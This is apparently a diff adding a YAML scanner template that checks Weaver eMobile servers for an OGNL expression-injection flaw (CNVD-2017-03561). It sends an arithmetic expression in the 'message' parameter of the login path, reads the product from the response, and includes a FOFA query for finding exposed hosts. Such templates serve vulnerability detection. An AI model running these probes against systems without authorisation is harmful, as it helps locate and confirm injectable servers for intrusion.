@@ -1,0 +1,26 @@
+id: poc-yaml-fanwei-emobile-ognl-injection-cnvd-2017-03561
+info:
+  name: 泛微eMobile OGNL注入漏洞(CNVD-2017-03561)
+  severity: high
+  tags:
+  - 两高一弱
+  - 表达式注入
+  - CNVD-2017-03561
+  finger: 泛微-eMobile
+  fofa: app="泛微-eMobile"
+variables:
+  num1: random_int(800000, 999999)
+  num2: random_int(800000, 999999)
+  result: num1 * num2
+  path: '/login.do
+
+    /login/login.do'
+requests:
+- method: GET
+  path: '{{.path}}?message={{.num1}}*{{.num2}}'
+  expression: 'status_code == 200 &&
+
+    contains(body, result)
+
+    '
+transport: http
